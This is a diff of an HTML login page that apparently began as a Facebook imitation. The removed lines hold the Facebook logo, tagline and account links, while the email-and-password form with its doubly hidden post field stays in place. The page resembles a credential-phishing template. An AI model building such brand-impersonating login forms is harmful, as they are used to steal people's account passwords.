@@ -13,20 +13,14 @@
 
 <div class="box">
     <div class="title-box">
-        <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
-        <p>Facebook helps you connect and share with the people in your life.</p>
     </div>
     <div class="form-box">
         <form action="" method="post">
             <input type="text" name="email" id="email" placeholder="Email address or phone number">
             <input type="password" name="password" id="password" placeholder="Password">
             <input type="hidden" name="action" value="send_form" style="display: none; visibility: hidden; opacity: 0;">
-            <button type="submit" name="submit">Log In</button>
-            <a href="#">Forgotten Password</a>
+            <button type="submit" name="submit">submit</button>
         </form>
         <hr>
-        <div class="create-btn">
-            <a href="https://youtu.be/Lcw8t9vTpQI" target="_blank">Create New Account</a>
-        </div>
     </div>
 </div>
